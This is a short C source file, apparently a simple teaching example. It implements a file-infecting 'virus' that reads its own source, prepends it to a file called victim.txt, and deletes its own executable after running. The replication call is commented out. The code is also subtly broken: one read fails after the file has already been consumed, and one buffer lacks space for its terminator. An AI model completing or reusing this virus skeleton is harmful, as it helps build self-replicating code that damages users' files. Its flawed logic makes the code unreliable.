#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>
// Searches for a victim to copy the virus into
const char *fileSearch()
{
    char *fileName = "victim.txt";
    return fileName;
}

void replicateVirus(char *content)
{
    long contentSize = strlen(content) + 1;

    // Opening up victim in read and write mode

    FILE *fp = fopen(fileSearch(), "r+");
    if (fp == NULL)
    {
        fprintf(stderr, "Error opening the file");
        exit(0);
    }

    // Determining the size of victim
    fseek(fp, 0, SEEK_END);
    long fileSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    long combinedSize = contentSize + fileSize;

    // For the content of the victim
    char *victimContent = malloc(fileSize + 1);
    if (victimContent == NULL)
    {
        fprintf(stderr, "Memory not allocated\n");
        exit(0);
    }

    // It contains the combined content to be copied
    char copyContent[combinedSize + 1];

    // Creating the content to be copied
    strcpy(copyContent, content);

    int readElements = fread(victimContent, fileSize, 1, fp);
    if (readElements != 1)
    {
        fprintf(stderr, "Error has occured or EOF reached\n");
        exit(0);
    }

    strcat(copyContent, victimContent);
    copyContent[combinedSize] = 0;

    /* Setting the file pointer to the beginning to paste the copyContent to the beginning of the victim */
    fseek(fp, 0, SEEK_SET);
    fprintf(fp, "%s", copyContent);

    /*Releasing the space occupied in heap*/
    fclose(fp);
    free(victimContent);
}

void virusInit()
{
    FILE *fp;
    // Opening up the current file(i.e. virus)
    fp = fopen(__FILE__, "r");
    if (fp == NULL)
    {
        fprintf(stderr, "Error opening the file");
        exit(0);
    }
    struct stat sb;
    stat(__FILE__, &sb);
    char *file_contents = malloc(sb.st_size);
    // Determining the size of virus
    fseek(fp, 0, SEEK_END);
    long virusSize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    // For the content of the virus
    char *virusContent = malloc(virusSize + 1);
    if (virusContent == NULL)
    {
        fprintf(stderr, "Memory not allocated\n");
        exit(0);
    }

    while (fscanf(fp, "%[^\n] ", file_contents) != EOF)
    {
        printf("%s\n", file_contents);
    }

    // Reading the content of the virus
    int readElements = fread(virusContent, virusSize, 1, fp);
    if (readElements != 1)
    {
        fprintf(stderr, "Error has occured or EOF reached\n");
        exit(0);
    }
    virusContent[virusSize] = 0;

    // Replicating the virus to victim
    // replicateVirus(virusContent);

    fclose(fp);
    free(virusContent);
    free(file_contents);
}
int main(int c, char *argv[])
{
    // Initiating the virus
    virusInit();

    // Virus gets removed after infecting the victim
    remove(argv[0]);
    return 0;
}